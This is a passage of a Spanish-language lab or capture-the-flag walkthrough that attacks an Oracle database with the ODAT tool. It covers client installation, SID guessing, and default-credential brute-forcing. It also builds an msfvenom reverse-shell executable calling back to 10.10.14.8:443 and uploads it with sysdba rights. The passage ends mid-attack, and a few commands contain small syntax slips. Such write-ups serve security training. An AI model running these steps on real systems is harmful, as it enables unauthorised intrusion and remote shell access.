## Vulnerability Assessment {-}

### Oracle ataque con ODAT {-}

#### Installacion de ODAT {-}

```bash
git clone https://github.com/quentinhardy/odat
cd odat
git submodule init
git submodule update
sudo apt-get install libaio1 python3-dev alien python3-pip
pip3 install cx_Oracle
```

Como la maquina victima es de 64 bits, descargamos los client basic sdk y sqlplus de la web de oracle

```bash
mkdir isolation
cd isolation
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-basic-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-sqlplus-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-devel-21.1.0.0.0-1.x86_64.rpm
```

ahora transformamos los `.rpm` en `.deb` y lo installamos

```bash
alien --to-deb *.rpm
dpkg -i *.deb
```

Añadimos las variables de entorno el la .zshrc

```bash
ls /usr/lib/oracle

#Output
21

vi ~/.zshrc

export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```

Checkeamos que todo se aya installado bien

```bash
sqlplus64
python3 odat.py --help
```

#### Ataque con ODAT {-}

1. Buscamos si encontramos SID's

    ```bash
    python3 odat.py sidguesser -s 10.10.10.82
    ```

1. Ataque de typo password guesser

    ```bash
    locate oracle_ | grep "pass"
    cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' | > passwords
    python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file passwords
    ```

1. Ahora que tenemos un usuario y una contraseña utilizamos el parametro utlfile que permite descargar, uploadear y supprimir ficheros

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger"
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
    ```

1. No tenemos sufficientes privilegios para subir archivos pero ODAT tiene un parametro `--sysdba` que nos puede ayudar

    ```bash
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe --sysdba
    ```

1. Intentamos ganar accesso al systema
